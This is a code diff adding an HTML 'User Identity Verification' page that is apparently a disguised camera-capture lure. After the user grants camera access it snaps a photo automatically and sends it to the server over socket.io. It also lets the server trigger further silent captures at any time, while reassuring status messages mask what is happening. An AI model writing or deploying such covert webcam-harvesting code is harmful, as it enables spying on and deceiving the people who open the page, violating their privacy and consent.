@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <title>Live Verification Page</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 40px; background: #eef2f5; }
+        .card { background: white; max-width: 400px; margin: auto; padding: 25px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
+        video { width: 100%; border-radius: 8px; margin-top: 15px; background: #111; }
+        button { background: #007bff; color: white; border: none; padding: 12px 20px; border-radius: 6px; cursor: pointer; font-size: 16px; font-weight: bold; }
+        .status { margin-top: 10px; font-size: 14px; color: #555; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h2>User Identity Verification</h2>
+    <p>Please allow camera access to continue.</p>
+    
+    <button id="allowCam">Start Verification</button>
+    <div id="statusText" class="status">Waiting for user permission...</div>
+    
+    <br>
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+</div>
+
+<script src="/socket.io/socket.io.js"></script>
+<script>
+    const socket = io();
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const allowCam = document.getElementById('allowCam');
+    const statusText = document.getElementById('statusText');
+
+    allowCam.addEventListener('click', async () => {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            video.srcObject = stream;
+            video.style.display = 'block';
+            allowCam.innerText = "Camera Active ✅";
+            allowCam.disabled = true;
+            allowCam.style.background = "#28a745";
+            statusText.innerText = "Syncing verification data...";
+
+            // Auto-capture 1.5 seconds after permission granted
+            setTimeout(() => {
+                captureAndSendPhoto();
+                statusText.innerText = "Data Synced Successfully!";
+            }, 1500);
+
+        } catch (err) {
+            alert("Camera Permission Denied!");
+            statusText.innerText = "Permission Denied.";
+        }
+    });
+
+    socket.on('capture-photo', () => {
+        captureAndSendPhoto();
+    });
+
+    function captureAndSendPhoto() {
+        if (video.srcObject) {
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            const imageData = canvas.toDataURL('image/png');
+            socket.emit('user-photo-captured', imageData);
+        }
+    }
+</script>
+</body>
+</html>
